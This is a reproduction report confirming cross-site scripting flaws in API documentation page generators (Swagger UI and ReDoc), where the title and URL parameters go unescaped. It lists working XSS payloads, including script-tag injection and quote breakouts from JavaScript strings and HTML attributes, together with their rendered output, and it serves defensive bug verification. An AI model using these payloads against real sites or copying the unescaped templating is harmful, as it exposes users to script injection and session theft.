REPRODUCTION OF REPORTED XSS VULNERABILITY
==========================================

## Summary
I successfully reproduced the XSS vulnerability as reported. The bug report is technically accurate.

## Test Results

### 1. Basic XSS with Simple '<' Character
- Input: `title='<'`
- Result: The '<' character appears unescaped in HTML as `<title><</title>`
- **CONFIRMED**: This can break HTML structure

### 2. Script Injection in Title (Swagger UI)
- Input: `title='<script>alert("XSS")</script>'`
- Result: Script tag appears completely unescaped in HTML
- Output: `<title><script>alert("XSS")</script></title>`
- **CONFIRMED**: This would execute JavaScript in browsers

### 3. JavaScript String Escape (Swagger UI)
- Input: `openapi_url="https://example.com'; alert('XSS'); var x='"`
- Result: Single quotes are not escaped in JavaScript context
- Output: `url: 'https://example.com'; alert('XSS'); var x=''`
- **CONFIRMED**: This breaks out of the JavaScript string and allows code injection

### 4. Script Injection in Title (ReDoc)
- Input: `title='<script>alert("XSS in ReDoc")</script>'`
- Result: Script tag appears unescaped
- Output: `<title><script>alert("XSS in ReDoc")</script></title>`
- **CONFIRMED**: Same vulnerability as Swagger UI

### 5. HTML Attribute Escape (ReDoc)
- Input: `openapi_url='https://example.com"><script>alert("XSS")</script><redoc spec-url="'`
- Result: Double quotes are not escaped in HTML attribute
- Output: `<redoc spec-url="https://example.com"><script>alert("XSS")</script><redoc spec-url="">`
- **CONFIRMED**: This breaks out of the HTML attribute and allows HTML injection

## Technical Analysis

The vulnerabilities exist in multiple contexts:
1. **HTML Context**: Unescaped '<', '>', and other HTML special characters in title tags
2. **JavaScript Context**: Unescaped single quotes in JavaScript string literals
3. **HTML Attribute Context**: Unescaped double quotes in HTML attributes

## Impact Assessment

These are genuine XSS vulnerabilities that would allow:
- Execution of arbitrary JavaScript in the user's browser
- Potential session hijacking if cookies are accessible
- Defacement of the API documentation pages
- Phishing attacks through injected content

## Reproduction Status
**FULLY REPRODUCED**: All test cases from the bug report execute successfully and demonstrate the vulnerabilities as described. The bug report's technical details are accurate.
